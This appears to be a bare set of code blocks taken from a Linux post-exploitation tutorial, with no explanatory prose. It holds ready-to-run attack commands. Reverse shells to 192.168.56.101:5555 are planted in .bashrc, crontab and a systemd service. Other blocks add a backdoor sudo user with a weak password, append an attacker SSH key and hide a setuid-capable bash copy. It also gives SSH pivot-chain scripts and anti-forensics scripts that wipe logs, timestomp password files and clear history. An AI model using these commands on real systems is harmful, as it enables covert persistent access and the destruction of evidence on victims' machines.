["```\n $ sudo apt install proxychains4\n```", "```\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n```", "```\n $ sudo useradd -m -s /bin/bash bashdoor $ sudo usermod -aG sudo bashdoor $ echo \"bashdoor:password123\" | sudo chpasswd\n```", "```\n $ nc -nlvp 5555\n```", "```\n $ echo \"(/bin/bash -i >& /dev/tcp/192.168.56.101/5555 0>&1) &\" >> ~/.bashrc\n```", "```\n * * * * * command_to_execute\n```", "```\n 30 3 * * * /path/to/script.sh\n```", "```\n $ echo \"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1'\" | crontab -\n```", "```\n [Unit]\nDescription=A Custom Service\nAfter=network.target\n[Service]\nExecStart=/usr/local/bin/a_service_script.sh\nRestart=on-failure\nUser=user\n[Install]\nWantedBy=multi-user.target\n```", "```\n #!/usr/bin/env bash\nsudo tee -a /etc/systemd/system/persistence.service << EOF\n[Unit]\nDescription=Persistence Service\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/5555 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\nsudo systemctl enable persistence.service\nsudo systemctl start persistence.service\n```", "```\n $ echo \"ssh-rsa AAAAB3NzaC1yc2E... attacker@example.com\" >> ~/.ssh/authorized_keys\n```", "```\n $ getcap /path/to/executable\n```", "```\n $ sudo setcap cap_setuid=+ep /path/to/executable\n```", "```\n $ getcap PID\n```", "```\n $ sudo setcap cap_setuid=eip /path/to/file\n```", "```\n #!/usr/bin/env bash\n# Create a hidden directory\nmkdir /tmp/.persist\n# Copy /bin/bash to the hidden directory\ncp /bin/bash /tmp/.persist/shell\n# Set the CAP_SETUID capability on the copied shell\nsetcap cap_setuid+ep /tmp/.persist/shell\n```", "```\n $ ssh -L 8080:internal_server:80 user@pivot_host\n```", "```\n $ ssh -R 8080:localhost:80 user@pivot_host\n```", "```\n $ ssh -D 9050 user@pivot_host\n```", "```\n $ curl --socks5 localhost:9050 http://internal_server\n```", "```\n $ proxychains -q nmap -sT -p- [target_ip]\n```", "```\n #!/usr/bin/env bash\npivot_hosts=(\"user-1@192.168.5.150\" \"user-2@10.1.0.50\" \"user-3@172.16.1.25\")\ntarget=\"user-4@192.168.20.200\"\nlocal_port=9090\n# Set up the chain\nfor ((i=0; i<${#pivot_hosts[@]}; i++)); do\n    next_port=$((local_port + i + 1))\n    if [ $i -eq 0 ]; then\n        ssh -f -N -L ${local_port}:localhost:${next_port} ${pivot_hosts[$i]}\n    elif [ $i -eq $((${#pivot_hosts[@]} - 1)) ]; then\n        ssh -f -N -L ${next_port}:${target%@*}:22 ${pivot_hosts[$i]}\n    else\n        ssh -f -N -L ${next_port}:localhost:$((next_port + 1)) ${pivot_hosts[$i]}\n    fi\ndone\necho \"[+] Pivot chain is established! Connect to ${target} via: ssh -p ${local_port} ${target#*@}\"\n```", "```\n #!/usr/bin/env bash\nlog_files=(\n    \"/var/log/auth.log\"\n    \"/var/log/syslog\"\n    \"/var/log/messages\"\n    \"/var/log/secure\"\n)\nfor file in \"${log_files[@]}\"; do\n    if [ -f \"$file\" ]; then\n        echo \"\" > \"$file\"\n        echo \"Cleared $file\"\n    else\n        echo \"$file not found\"\n    fi\ndone\n```", "```\n #!/usr/bin/env bash\nfiles_to_modify=(\n    \"/etc/passwd\"\n    \"/etc/shadow\"\n    \"/var/log/auth.log\"\n)\nreference_file=\"/etc/hosts\"\nfor file in \"${files_to_modify[@]}\"; do\n    if [ -f \"$file\" ]; then\n        touch -r \"$reference_file\" \"$file\"\n        echo \"Modified timestamp of $file\"\n    else\n        echo \"$file not found\"\n    fi\ndone\n```", "```\n shred -u -z -n 3 sensitive_file.txt\n```", "```\n sudo ip -s -s neigh flush all\n```", "```\n #!/usr/bin/env bash\n# Clear bash history\nhistory -c\nhistory -w\n# Clear common log files\nlog_files=(\"/var/log/auth.log\" \"/var/log/syslog\" \"/var/log/messages\" \"/var/log/secure\")\nfor file in \"${log_files[@]}\"; do\n    if [ -f \"$file\" ]; then\n        sudo echo \"\" > \"$file\"\n        echo \"Cleared $file\"\n    fi\ndone\n# Remove temporary files\nidentifier=\"pentester123\"\nfind /tmp /var/tmp -user \"$(whoami)\" -name \"*$identifier*\" -type f -delete\n# Modify timestamps\ntouch -r /etc/hosts /etc/passwd /etc/shadow /var/log/auth.log\n# Securely remove sensitive files\nshred -u -z -n 3 /tmp/sensitive_data.txt\n# Flush ARP cache\nsudo ip -s -s neigh flush all\necho \"Cleanup completed\"\n```"]